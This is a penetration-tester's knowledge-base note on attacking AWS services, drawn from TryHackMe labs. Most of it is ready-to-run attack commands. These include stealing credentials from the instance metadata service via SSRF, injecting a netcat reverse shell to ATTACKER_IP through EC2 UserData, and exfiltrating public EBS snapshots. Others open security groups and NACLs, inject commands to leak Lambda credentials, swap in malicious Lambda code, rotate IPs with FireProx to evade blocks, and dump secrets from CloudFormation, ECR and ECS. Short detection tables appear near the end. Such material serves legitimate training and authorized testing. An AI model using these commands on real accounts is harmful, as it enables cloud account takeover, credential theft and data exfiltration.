---
title: "AWS Service Attacks"
type: technique
tags: [aws, cloud, ec2, enumeration, exploitation, s3, thm, vpc]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-aws-intro, thm-aws-core-services, thm-aws-serverless, git-cloudfox]
---

# AWS Service Attacks

## What It Is

AWS exposes a third dimension of attack surface beyond traditional network-centric security. Every AWS resource is controlled through authenticated API calls — there is no "inside the firewall" equivalent. Compromising valid IAM credentials gives an attacker full programmatic control over the targeted account. The primary attack surfaces are EC2 (compute), S3 (object storage), VPC (software-defined networking), Lambda (serverless compute), and API Gateway (managed API proxy).

See also: [[cloud-iam-attacks]], [[aws]]

---

## AWS Basics

### Accounts and Root User

- An AWS account is a 12-digit numeric ID (e.g., `123456789012`) and is the fundamental security boundary.
- Each account has one **root user** identified by the email address used to create the account. The root user has unrestricted access to all resources.
- MFA is **not enforced by default** for root users. Accounts created via AWS Organizations have a randomly generated root password; a password reset via the root email is needed to log in.
- **Attack vector**: If you control the root user's email inbox (and no MFA or phone number is set), you can reset the root password and take over the entire account. Tool: Quiet Riot can enumerate valid root user email addresses via legacy S3 ACLs.

### ARN Format

Every AWS resource is addressed by an Amazon Resource Name (ARN):

```
arn:partition:service:region:account-id:resource-type/resource-id
```

Examples:
```
arn:aws:ec2:us-east-1:123456789012:instance/i-00c07e4f8c9affca3
arn:aws:iam::123456789012:role/admin-role
arn:aws:s3:::my-bucket
```

The IAM and S3 namespaces are global (no region field). The partition is `aws` for commercial, `aws-cn` for China, `aws-us-gov` for GovCloud.

### Regions and Availability Zones

- Regions are geographic locations (e.g., `us-east-1` = N. Virginia). Each region contains multiple **Availability Zones (AZs)** — isolated data centers within 60 miles of each other.
- Most services are regional; IAM, CloudFront, Route 53, and Organizations are global.
- **STS** (Security Token Service) has both global and regional endpoints. Tokens from regional endpoints are valid in all regions; tokens from the global endpoint are only valid in default-enabled regions.
- S3 bucket **names** are globally unique but data is stored regionally.

### AWS Organizations

- AWS Organizations allows central management of multiple accounts under a hierarchy of Organizational Units (OUs).
- The **Organization Management Account** has an `OrganizationAccountAccessRole` with full admin rights in all child accounts by default — a high-value target.
- **Service Control Policies (SCPs)** restrict actions for all principals in child accounts (including root users of child accounts), but SCPs do **not** apply to the Management Account itself.

### VPC Link-Local Services

Inside every VPC, these services are available at fixed link-local addresses:

| Address | Service |
|---------|---------|
| `169.254.169.253` | Route 53 DNS Resolver |
| `169.254.169.254` | EC2 Instance Metadata Service (IMDS) |
| `169.254.170.2` | ECS Task Metadata Service |
| `169.254.169.123` | Amazon Time Sync (NTP) |

---

## EC2 Attacks

### Instance Metadata Service (IMDS) — SSRF to Credential Theft

The IMDS at `169.254.169.254` exposes temporary IAM credentials for the EC2 Instance Profile (role attached to the instance). This was the primary vector in the 2019 Capital One breach.

**IMDSv1** (no token required — vulnerable):

```bash
# Get the role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials for the role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

Response contains `AccessKeyId`, `SecretAccessKey`, `Token`, and `Expiration`.

**IMDSv2** (session-token required — harder to exploit via basic SSRF):

```bash
# Step 1: Get a session token (PUT request required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token for subsequent requests
role_name=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name}
```

Without the token on IMDSv2, the response is HTTP `401`.

**SSRF exploitation workflow**:
1. Find an SSRF vulnerability in a web app running on EC2
2. Use the SSRF to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Retrieve the role name, then fetch credentials for that role
4. Configure the stolen credentials locally

```bash
aws configure set aws_access_key_id ACCESS_KEY_ID --profile stolen
aws configure set aws_secret_access_key SECRET_ACCESS_KEY --profile stolen
aws configure set aws_session_token SESSION_TOKEN --profile stolen
aws sts get-caller-identity --profile stolen
```

**Other IMDS data useful for attackers**:
```bash
# User data (often contains secrets or configuration)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/user-data

# Instance ID (needed for further API calls)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/instance-id

# Placement AZ (needed for volume operations)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/placement/availability-zone
```

### User Data Abuse

UserData is a startup script executed by cloud-init on each boot. It frequently contains secrets, environment-specific configuration, and plaintext passwords. If an attacker has `ec2:ModifyInstanceAttribute`, they can replace UserData with a reverse shell payload that executes on the next boot.

```bash
# Read UserData from outside the instance (requires IAM permissions)
aws ec2 describe-instance-attribute \
  --attribute userData \
  --instance-id i-0123456789abcdef0 \
  --query UserData --output text | base64 -d

# Inject reverse shell via UserData modification
cat > reverse-shell.txt <<'EOF'
#cloud-boothook
#!/bin/bash -x
yum install -y nc && nc ATTACKER_IP 4444 -e /bin/bash
EOF
base64 reverse-shell.txt > reverse-shell.enc
aws ec2 stop-instances --instance-ids i-0123456789abcdef0
aws ec2 modify-instance-attribute --instance-id i-0123456789abcdef0 \
  --attribute userData --value file://reverse-shell.enc
aws ec2 start-instances --instance-ids i-0123456789abcdef0
```

### EBS Snapshot Exfiltration

EBS snapshots can be shared publicly or across accounts. If you find a publicly exposed snapshot, you can attach it to your own EC2 instance and read its data:

```bash
# Check if a snapshot is public / get metadata
aws ec2 describe-snapshots --snapshot-ids snap-0123456789abcdef0

# Create a volume from the snapshot in your AZ
aws ec2 create-volume \
  --snapshot-id snap-0123456789abcdef0 \
  --volume-type gp3 \
  --availability-zone us-east-1c

# Attach the volume to your instance
aws ec2 attach-volume \
  --device /dev/sdh \
  --instance-id i-yourid \
  --volume-id vol-newvolumeid

# Mount and read the volume from inside the instance
sudo mkdir /snapshot-recovery
sudo mount /dev/nvme1n1 /snapshot-recovery
ls /snapshot-recovery
```

### SSM Agent Abuse

If an EC2 instance has the SSM agent installed and the `AmazonSSMManagedInstanceCore` policy attached, an attacker with `ssm:StartSession` can obtain a shell without SSH access:

```bash
aws ssm start-session --target i-0123456789abcdef0
```

### EC2 Instance Enumeration

```bash
# List all instances with name, ID, state, and IPs
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[Tags[?Key==`Name`].Value,InstanceId,State.Name,PublicIpAddress,PrivateIpAddress]' \
  --output text | sed 'N;s/\n/ /'

# Get UserData for all instances
LIST=$(aws ec2 describe-instances --query Reservations[].Instances[].InstanceId --output text)
for i in $LIST; do
  aws ec2 describe-instance-attribute --instance-id $i --attribute userData \
    --query UserData --output text | base64 -d > $i-USERDATA.txt
done

# List ENIs (full picture of VPC resources)
aws ec2 describe-network-interfaces
```

### Exposed Key Pairs and AMIs

```bash
# List available AMIs in an account (can contain secrets in baked config)
aws ec2 describe-images --owners ACCOUNT_ID

# Restore an AMI from an S3 binary blob found in a public bucket
aws ec2 create-restore-image-task \
  --object-key ami-056a6742115906e8c.bin \
  --bucket public-bucket-name \
  --name recovered-image

# Launch a recovered AMI
aws ec2 run-instances \
  --image-id ami-0123456789abcdef0 \
  --instance-type t3a.micro \
  --key-name attacker-key \
  --subnet-id subnet-xxx \
  --security-group-id sg-xxx
```

---

## S3 Attacks

### Bucket Enumeration

S3 bucket names are globally unique and follow predictable patterns. Enumeration techniques:

- **DNS reconnaissance**: `nslookup assets.target.com.s3.amazonaws.com`
- **Certificate Transparency logs**: `crt.sh` often reveals subdomains pointing to S3
- **Google dorks**: `site:s3.amazonaws.com "target-name"`
- **Page source**: JavaScript files often reference S3 bucket URLs

Public bucket URL formats:
```
https://bucket-name.s3.amazonaws.com/
https://s3.amazonaws.com/bucket-name/
https://bucket-name.s3-region.amazonaws.com/
```

### Attacking Public S3 Buckets

```bash
# Check if a bucket is publicly accessible (no credentials needed)
aws s3 ls s3://target-bucket-name --no-sign-request

# Download entire public bucket
aws s3 sync s3://target-bucket-name . --no-sign-request

# Check bucket policy status
aws s3api get-bucket-policy-status --bucket target-bucket-name

# Read bucket policy
aws s3api get-bucket-policy --bucket target-bucket-name --query Policy --output text | jq

# List objects with credentials
aws s3 ls s3://target-bucket-name --recursive
```

### S3 ACL and Bucket Policy Misconfigurations

- **Public read**: `"Principal": "*"` with `s3:GetObject` — anyone can read all objects
- **Public write**: `"Principal": "*"` with `s3:PutObject` — anyone can overwrite files
- **Authenticated AWS users**: The `"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"` group in S3 ACLs grants access to **any AWS customer** worldwide — not just your account
- **CloudFront origin bypass**: If a CloudFront distribution fronts an S3 bucket but no Origin Access Identity (OAI) restricts direct access, the bucket can be accessed directly, bypassing WAF/geo-restrictions

A dangerous public read/write bucket policy:
```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}
```

### S3 as Attack Substrate

S3 is used as storage for CloudFormation templates, Lambda code, golden AMIs, CloudTrail logs, and CI/CD artifacts. Write access to these buckets can lead to code execution:

- Overwrite a Lambda zip file in S3 → next deployment runs attacker code
- Replace a CloudFormation template → phish an admin into deploying malicious infrastructure
- Inject into a golden AMI pipeline → compromise all instances spawned from the AMI

```bash
# Upload malicious file to trigger Lambda (if S3 → Lambda trigger exists)
aws s3 cp payload.txt s3://pipeline-bucket/

# Copy data from restricted bucket via VPC endpoint (if in correct VPC)
aws s3 cp s3://restricted-bucket/secrets.txt . --sse aws:kms
```

### VPC Endpoint-Restricted Buckets

Some buckets are locked to access only from a specific VPC endpoint (using `aws:SourceVpc` or `aws:SourceVpce` conditions). If the bucket denies all access except from a VPC endpoint, you need to operate from a Lambda function or EC2 instance that sits in that VPC.

---

## VPC Attacks

### Security Group Misconfigurations

Security groups are the primary network-level control for EC2 and other VPC resources. Common misconfigurations:

- SSH (port 22) or RDP (port 3389) open to `0.0.0.0/0`
- All ports open to an overly broad CIDR
- Security groups referencing other security groups incorrectly

```bash
# Add permissive inbound rule (requires ec2:AuthorizeSecurityGroupIngress)
aws ec2 authorize-security-group-ingress \
  --group-id sg-0123456789abcdef0 \
  --protocol all \
  --port 0-65535 \
  --cidr 0.0.0.0/0
```

### Route Table Manipulation

With `ec2:CreateRoute`, an attacker can add a route to the internet gateway in a private subnet, exposing previously isolated instances:

```bash
# Make a private subnet publicly routable (requires ec2:CreateRoute)
aws ec2 create-route \
  --route-table-id rtb-0123456789abcdef0 \
  --destination-cidr-block 0.0.0.0/0 \
  --gateway-id igw-0123456789abcdef0
```

### NACL Bypass

Network ACLs are stateless and subnet-level. If you have `ec2:CreateNetworkAclEntry`, you can prepend permissive rules:

```bash
# Allow all inbound (rule 1 evaluated first)
aws ec2 create-network-acl-entry \
  --cidr-block 0.0.0.0/0 \
  --ingress \
  --protocol -1 \
  --rule-action allow \
  --rule-number 1 \
  --network-acl-id acl-0123456789abcdef0

# Also allow all outbound (NACLs are stateless)
aws ec2 create-network-acl-entry \
  --cidr-block 0.0.0.0/0 \
  --egress \
  --protocol -1 \
  --rule-action allow \
  --rule-number 1 \
  --network-acl-id acl-0123456789abcdef0
```

### Assigning a Public IP to a Private Instance

```bash
# Allocate a new elastic IP
aws ec2 allocate-address

# Find the ENI of the target instance
aws ec2 describe-instances > instances.json
grep eni instances.json

# Associate the elastic IP with the target ENI
aws ec2 associate-address \
  --network-interface-id eni-0123456789abcdef0 \
  --allocation-id eipalloc-0123456789abcdef0
```

### VPC Peering and Lateral Movement

- VPC peering allows traffic between two VPCs. If a compromised VPC is peered with another, it may provide a path to pivot.
- VPC peering is **non-transitive**: VPC-A → VPC-B → VPC-C does not allow A to reach C directly.
- DirectConnect and Site-to-Site VPN are pathways from cloud to on-premises; credential compromise in a cloud account can pivot to corporate internal networks.

### VPC Monitoring (Defender Perspective)

| Tool | Data |
|------|------|
| VPC Flow Logs | Packet headers (IPs, ports, protocols, ACCEPT/REJECT) — no payload |
| VPC Traffic Mirroring | Full packet capture per ENI |
| Route 53 Resolver Query Logging | DNS queries from VPC instances |
| GuardDuty | Threat detection using Flow Logs and DNS Logs |

---

## Lambda/Serverless Attacks

### Environment Variable Secret Theft

Lambda execution roles and secrets are injected as environment variables. These are visible to anyone who can invoke the function with a command injection payload, or to anyone with `lambda:GetFunction`:

```bash
# Get function configuration including environment variables
aws lambda get-function --function-name target-function

# List all Lambda functions and their roles
aws lambda list-functions
```

**Command injection via unsanitized input** (e.g., Python `os.popen()` on user-supplied prefix):

```bash
# Payload to exfiltrate environment variables via command injection
# (when function runs: aws s3 ls s3://bucket/{prefix})
cat > payload.json <<'EOF'
{"prefix": " ; env "}
EOF

aws lambda invoke \
  --function-name vulnerable-function \
  --payload fileb://payload.json \
  output.json

cat output.json | jq -r . | grep AWS
```

This leaks `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` — temporary credentials for the Lambda execution role.

### Lambda Execution Role Escalation

If a Lambda function has `AWSLambda_FullAccess` (intended for admins, not functions), it can modify other functions' code. Chained attack:

1. Exploit command injection in a less-privileged Lambda to steal its execution role credentials
2. Use those credentials to update a more-privileged Lambda's code (`lambda:UpdateFunctionCode`)
3. Invoke the modified Lambda to perform privileged operations (e.g., read VPC-restricted S3 buckets)

```bash
# Update a Lambda function's code with malicious zip
aws lambda update-function-code \
  --function-name privileged-function \
  --zip-file fileb://compromised.zip
```

### Lambda Function URLs

Lambda function URLs are dedicated HTTPS endpoints (`https://<url-id>.lambda-url.<region>.on.aws`) that can invoke a Lambda without API Gateway. If the function URL is configured without IAM authentication, any internet user can invoke the function with a simple `curl`.

```bash
# Check Lambda resource-based policy for public access
aws lambda get-policy \
  --function-name target-function \
  --query Policy --output text | jq

# Invoke a publicly accessible Lambda function URL
curl https://abc123.lambda-url.us-east-1.on.aws/ \
  -d '{"key": "value"}'
```

### SSRF via Lambda

Lambda functions running in a VPC get a private IP address. If the function makes HTTP requests with user-supplied URLs, SSRF can target internal VPC resources or the ECS metadata endpoint at `169.254.170.2`.

```bash
# ECS/Lambda container credentials (if AWS_CONTAINER_CREDENTIALS_RELATIVE_URI is set)
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# CloudShell credentials
curl $AWS_CONTAINER_CREDENTIALS_FULL_URI \
  -H "X-aws-ec2-metadata-token: $AWS_CONTAINER_AUTHORIZATION_TOKEN"
```

---

## API Gateway Attacks

### Overview

API Gateway is a managed reverse proxy for Lambda, HTTP endpoints, DynamoDB, S3, and other AWS services. Attack surface includes unauthenticated endpoints, weak authorizer logic, and stage variable injection.

### Using API Gateway as an Attacker Proxy (FireProx)

API Gateway can be used to rotate source IP addresses on requests, bypassing IP-based rate limits and WAF blocks. FireProx creates an API Gateway passthrough to any target URL:

```bash
# Clone and install FireProx
git clone https://github.com/ustayready/fireprox
cd fireprox && pip3 install -r requirements.txt

# Create a rotating proxy to target API
python3 fire.py --command create --url https://api.target.com

# Use the generated endpoint (each request comes from a different AWS IP)
curl https://UNIQUE_ID.execute-api.us-east-1.amazonaws.com/fireprox/endpoint

# List active proxies
python3 fire.py --command list

# Delete when done
python3 fire.py --command delete --api_id UNIQUE_ID
```

### Lambda Authorizer Bypass — Greedy Path Matching

Lambda authorizers control access to API Gateway resources. A common misconfiguration is wildcard path matching that allows unintended access:

```python
# Vulnerable authorizer: allows "testing123" token to access */test/*
# The wildcard matches /prod/test/ as well as /test/test/
"Resource": "arn:aws:execute-api:us-east-1:{ACCOUNT_ID}:*/*/test/*"
```

This means a request to `/prod/test/` with the `testing123` token succeeds because `/test/` appears in the path, matching the `*/test/*` resource ARN.

**Exploitation**:
```bash
# Access test endpoint normally
curl https://api.target.com/test/test/ -H "authorizationToken:testing123"

# Access prod endpoint using test token (greedy path expansion bypass)
curl https://api.target.com/prod/test/ -H "authorizationToken:testing123"

# Escalate using obtained prod token to access admin
curl https://api.target.com/prod/admin/ -H "authorizationToken:PROD_TOKEN"
```

### Unauthenticated Endpoints

```bash
# Enumerate API Gateway APIs in an account
aws apigateway get-rest-apis

# Get stages (dev, staging, prod)
aws apigateway get-stages --rest-api-id API_ID

# Get resources/methods
aws apigateway get-resources --rest-api-id API_ID

# Invoke an API endpoint
curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/RESOURCE
```

---

## Workload Identity Abuse

Any compute resource (EC2, ECS task, Lambda, AppRunner, SageMaker notebook) with an admin-level IAM role attached is equivalent to finding a plaintext admin credential. Enumerating attached roles across all compute types is a high-yield post-access step.

```bash
# Find EC2 instances with admin roles
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn]' \
  --output text | grep -v None

# Find Lambda functions with admin roles
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Role]' --output text | grep -i admin

# Find ECS tasks with admin task roles
aws ecs list-tasks --cluster CLUSTER
aws ecs describe-tasks --cluster CLUSTER --tasks TASK_ARN \
  --query 'tasks[*].[taskArn,taskDefinitionArn,overrides.taskRoleArn]'
```

If a workload has an admin-equivalent role, pivot to it via its execution context rather than trying to escalate IAM directly.

---

## CloudFormation Secrets

CloudFormation stack parameters and outputs are a consistently overlooked source of credentials. Stacks frequently store database passwords, API keys, and internal hostnames as parameters (sometimes marked `NoEcho` but still recoverable) or as stack outputs referenced by other services.

```bash
# Dump all stack parameters and outputs
aws cloudformation describe-stacks \
  --query 'Stacks[*].[StackName,Parameters,Outputs]' \
  --output json | python3 -c "
import sys, json
for stack in json.load(sys.stdin):
    name, params, outputs = stack
    print(f'=== {name} ===')
    for p in (params or []):
        print(f'  PARAM {p[\"ParameterKey\"]}={p[\"ParameterValue\"]}')
    for o in (outputs or []):
        print(f'  OUTPUT {o[\"OutputKey\"]}={o[\"OutputValue\"]}')
"
```

Also enumerate CodeBuild environment variables (frequently contain build-time secrets):

```bash
aws codebuild batch-get-projects --names $(aws codebuild list-projects --query 'projects' --output text) \
  --query 'projects[*].[name,environment.environmentVariables]' --output json
```

---

## ECS Task Credential Theft

ECS tasks expose temporary credentials through the container metadata endpoint — analogous to IMDS for EC2. The endpoint address is injected as an environment variable `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.

```bash
# From inside a compromised container
curl 169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}

# If AWS_CONTAINER_CREDENTIALS_FULL_URI is set instead (Fargate/EKS)
curl "$AWS_CONTAINER_CREDENTIALS_FULL_URI" \
  -H "X-aws-ec2-metadata-token: $AWS_CONTAINER_AUTHORIZATION_TOKEN"
```

The response contains `AccessKeyId`, `SecretAccessKey`, `Token` for the task's IAM role.

---

## ECR Image Secret Extraction

Container images in ECR often contain hardcoded secrets baked into layers — environment variables in Dockerfiles, config files copied into the image, credentials used during build. With `ecr:GetAuthorizationToken` + `ecr:BatchGetImage`, images can be pulled and inspected:

```bash
# Authenticate to ECR
aws ecr get-login-password | docker login --username AWS \
  --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com

# Pull the most recently pushed image from each repo
aws ecr describe-repositories --query 'repositories[*].repositoryUri' --output text | \
  tr '\t' '\n' | while read repo; do
    TAG=$(aws ecr describe-images --repository-name $(basename $repo) \
      --query 'sort_by(imageDetails,&imagePushedAt)[-1].imageTags[0]' --output text)
    docker pull "${repo}:${TAG}"
  done

# Inspect all layers for secrets (no need to run the image)
docker save IMAGE | tar x --to-stdout '*/layer.tar' | tar t 2>/dev/null | grep -E '\.env|config|credentials|secret'
docker history --no-trunc IMAGE | grep -i 'ENV\|ARG\|SECRET\|KEY\|PASSWORD'
```

---

## Cross-Account Lateral Movement via RAM

AWS Resource Access Manager (RAM) allows sharing resources across accounts. If an account shares resources (subnets, Transit Gateway, License Manager configs, etc.) with other accounts, this reveals trusted relationships and potential pivot paths.

```bash
# Resources shared FROM this account to others
aws ram list-resources --resource-owner SELF \
  --query 'resources[*].[resourceArn,resourceShareArn]' --output text

# Resources shared TO this account from others
aws ram list-resources --resource-owner OTHER-ACCOUNTS \
  --query 'resources[*].[resourceArn,type]' --output text

# List all resource shares and their principals
aws ram get-resource-shares --resource-owner SELF \
  --query 'resourceShares[*].[name,status,resourceShareArn]' --output text

# For each share, see which accounts have access
aws ram list-principals --resource-owner SELF \
  --query 'principals[*].[id,resourceShareArn]' --output text
```

A shared VPC subnet from account A to account B means a compromised resource in either account can potentially reach the other's workloads at the network layer.

---

## EKS Public Endpoint Exposure

EKS clusters with `publicAccessEnabled: true` expose the Kubernetes API server to the internet. With the right kubeconfig (and IAM permissions), this is a direct path to cluster compromise.

```bash
# List EKS clusters and their endpoint visibility
aws eks describe-cluster --name CLUSTER_NAME \
  --query 'cluster.[name,endpoint,resourcesVpcConfig.endpointPublicAccess,resourcesVpcConfig.publicAccessCidrs,roleArn]'

# Generate kubeconfig for a cluster
aws eks update-kubeconfig --name CLUSTER_NAME --region REGION

# Once authenticated, enumerate permissions
kubectl auth can-i --list
kubectl get secrets -n kube-system
kubectl get serviceaccounts --all-namespaces
```

IAM roles attached to node groups (`ec2:DescribeInstances` on worker nodes → IMDS → node role credentials) can be a path into the cluster even without direct API server access.

---

## Detection and Defence

| Control | What it monitors |
|---------|-----------------|
| CloudTrail | All AWS API calls — actions, caller identity, source IP, timestamp |
| GuardDuty | Threat detection using CloudTrail, VPC Flow Logs, DNS Logs, and S3 data events |
| VPC Flow Logs | Network traffic metadata (IPs, ports, ACCEPT/REJECT) |
| AWS Config | Resource configuration changes and compliance |
| CloudWatch | Metrics, logs, alarms for Lambda, EC2, and other services |
| Macie | Sensitive data classification in S3 |
| Security Hub | Aggregated findings across security services |

**Key attacker actions that appear in CloudTrail**:
- `sts:GetCallerIdentity` — attacker fingerprinting credentials
- `iam:ListUsers`, `iam:ListRoles`, `iam:GetPolicy` — IAM enumeration
- `ec2:DescribeInstances`, `ec2:DescribeSnapshots` — EC2 enumeration
- `s3:ListBuckets`, `s3:GetObject` — S3 reconnaissance
- `lambda:GetFunction`, `lambda:InvokeFunction` — Lambda abuse
- `ec2:ModifyInstanceAttribute` — UserData injection
- `sts:AssumeRole` with unusual `roleSessionName` — role pivoting

---

## CloudFox Enumeration

**CloudFox** (BishopFox) is an attack-path enumeration CLI designed to surface exploitable misconfigurations across AWS, GCP, and Azure. It outputs loot files with actionable follow-on commands and integrates with PMapper for transitive privilege escalation analysis.

Installation:
```bash
brew install cloudfox
# or
go install github.com/BishopFox/cloudfox@latest
```

Recommended IAM permissions: `SecurityAudit` managed policy plus the [CloudFox custom policy](https://github.com/BishopFox/cloudfox) (tightly scoped to only what CloudFox needs).

Run all AWS checks against a named profile:
```bash
cloudfox aws --profile PROFILE_NAME all-checks
```

### Secrets and Credential Discovery

| Command | What it finds |
|---------|--------------|
| `cloudfox aws secrets` | Secrets in SecretsManager and SSM Parameter Store |
| `cloudfox aws env-vars` | Environment variables from App Runner, ECS, Lambda, Lightsail, SageMaker |
| `cloudfox aws cloudformation` | Stack parameters and outputs (frequent secret storage location) |
| `cloudfox aws codebuild` | CodeBuild project environment variables |

```bash
cloudfox aws -p PROFILE secrets
cloudfox aws -p PROFILE env-vars
cloudfox aws -p PROFILE cloudformation
```

After running, pair results with `iam-simulator` or `pmapper` to determine which principals can access the discovered secrets.

### Workload Identity and Role Trust Enumeration

```bash
# List all compute workloads and attached IAM roles; flags admin-level roles
cloudfox aws -p PROFILE workloads

# Enumerate IAM role trust policies; flags overly permissive trusts
cloudfox aws -p PROFILE role-trusts

# Enumerate resource policies (S3, Lambda, SQS, SNS, KMS, etc.)
# KMS policies excluded by default; add --include-kms to enable
cloudfox aws -p PROFILE resource-trusts
```

The `workloads` command covers EC2 instance profiles, ECS task roles, Lambda execution roles, App Runner service roles, and SageMaker execution roles in a single sweep. Combined with PMapper data, it reveals which workloads are a single hop from admin.

### ECS Metadata and ECR

```bash
# Enumerate ECS tasks: cluster, task definition, container instance, IAM principal
cloudfox aws -p PROFILE ecs-tasks

# List most recently pushed image URIs from all ECR repositories
# Generates loot file with docker pull commands for layer inspection
cloudfox aws -p PROFILE ecr
```

Use ECR output to pull images and inspect layers for baked-in credentials:
```bash
docker history --no-trunc IMAGE | grep -iE 'ENV|ARG|SECRET|KEY|PASSWORD'
docker save IMAGE | tar x --to-stdout '*/layer.tar' | tar t 2>/dev/null
```

### Cross-Account Trust Enumeration

```bash
# Resources shared via RAM: outbound and inbound cross-account shares
cloudfox aws -p PROFILE ram

# Roles assumed by principals in this account (outbound trust history)
cloudfox aws -p PROFILE outbound-assumed-roles

# Cross-account privilege escalation paths (requires pmapper data first)
cloudfox aws -p PROFILE cape

# Accounts within AWS Organizations
cloudfox aws -p PROFILE orgs
```

The `cape` (Cross-Account Privilege Escalation) command requires PMapper graph data to be present locally; run `pmapper graph create` first.

### EKS and Network Enumeration

```bash
# EKS clusters: endpoint exposure, IAM roles, generates kubeconfig commands
cloudfox aws -p PROFILE eks

# Service endpoints from all regional services; identifies externally accessible resources
cloudfox aws -p PROFILE endpoints

# EC2 instances with IPs, instance profiles; generates nmap loot file
cloudfox aws -p PROFILE instances

# S3 buckets
cloudfox aws -p PROFILE buckets

# IAM permissions for all users and roles (grep-searchable loot file)
cloudfox aws -p PROFILE permissions
```

---

## Tools

| Tool | Purpose |
|------|---------|
| `aws-cli` | Official AWS CLI for all API interactions |
| Pacu | AWS exploitation framework (modular, CloudTrail-aware) |
| Scout Suite | Multi-cloud security auditing and misconfiguration scanner |
| Prowler | AWS security best practices scanner |
| Quiet Riot | Unauthenticated IAM principal enumeration |
| FireProx | IP rotation via API Gateway for offensive engagements |
| TruffleHog | Credential scanning in git repositories |
| boto3 (Python) | AWS SDK for Python — used in custom attack scripts |
| CloudFox | Attack-path enumeration: secrets, workloads, role trusts, cross-account, ECS/ECR, EKS |
| PMapper | Transitive IAM privilege escalation graph; integrates with CloudFox `cape` and `pmapper` commands |

---

## Sources

- TryHackMe: AWS Basic Concepts (`awsbasicconcepts`)
- TryHackMe: AWS Cloud 101 (`cloud101aws`)
- TryHackMe: Amazon EC2 — Attack & Defense (`amazonec2attackdefense`)
- TryHackMe: Amazon EC2 — Data Exfiltration (`amazonec2dataexfiltration`)
- TryHackMe: AWS S3 Attack and Defense (`awss3service`)
- TryHackMe: AWS VPC — Attack & Defense (`attackingdefendingvpcs`)
- TryHackMe: AWS VPC — Data Exfiltration (`awsvpcdataexfiltration`)
- TryHackMe: AWS Lambda (`awslambda`)
- TryHackMe: Lambda Data Exfiltration (`lambdadataexfiltration`)
- TryHackMe: AWS API Gateway (`awsapigateway`)
